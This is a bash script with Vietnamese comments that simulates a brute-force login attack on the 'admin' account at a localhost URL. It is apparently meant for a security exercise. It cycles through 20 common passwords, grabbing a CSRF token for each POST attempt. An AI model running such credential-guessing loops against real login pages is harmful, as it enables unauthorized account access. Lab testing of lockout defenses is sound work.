#!/bin/bash
# scripts/simulate_bruteforce.sh
# Mục đích: Mô phỏng tấn công dò mật khẩu (brute force) phục vụ bài tập an toàn hệ thống
set -e

TARGET_URL="https://localhost/login"
COOKIE_JAR="/tmp/bf_cookies.txt"
rm -f "$COOKIE_JAR"

echo "=== Bắt đầu mô phỏng tấn công Brute-force Login vào tài khoản admin ==="
echo "Mục tiêu: $TARGET_URL"
echo "Thời gian bắt đầu: $(date -u)"

PASSWORDS=(
  "123456" "password" "admin123" "welcome" "login@123"
  "qwerty" "letmein" "monkey" "dragon" "football"
  "master" "iloveyou" "restaurant1" "root123" "pass1234"
  "secret99" "guest123" "admin2026" "hacker123" "testing_pw"
)

for i in "${!PASSWORDS[@]}"; do
  ATTEMPT=$((i + 1))
  PW="${PASSWORDS[$i]}"

  # Lấy CSRF token và session cookie mới
  LOGIN_PAGE=$(curl -k -s -c "$COOKIE_JAR" "$TARGET_URL")
  CSRF_TOKEN=$(echo "$LOGIN_PAGE" | grep -o 'name="_csrf" value="[^"]*"' | cut -d'"' -f4)

  # Gửi request đăng nhập sai
  HTTP_CODE=$(curl -k -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -o /dev/null -w "%{http_code}" \
    -X POST "$TARGET_URL" \
    --data-urlencode "_csrf=$CSRF_TOKEN" \
    --data-urlencode "username=admin" \
    --data-urlencode "password=$PW")

  echo "[Lần $ATTEMPT/20] Thử mật khẩu '$PW' -> HTTP $HTTP_CODE"
  sleep 0.5
done

rm -f "$COOKIE_JAR"
echo "=== Hoàn thành mô phỏng brute-force (20 yêu cầu) tại: $(date -u) ==="